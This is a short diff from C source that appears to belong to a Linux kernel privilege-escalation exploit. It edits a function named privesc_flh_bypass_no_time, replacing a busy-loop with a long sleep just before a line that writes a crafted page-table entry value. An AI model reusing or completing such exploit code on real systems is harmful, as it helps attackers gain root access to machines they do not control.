@@ -375,9 +375,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-    for (int i = 0; i < 1000; i++) {
-        long int useless_operation = i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i;
-    }
+	sleep(9999);
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
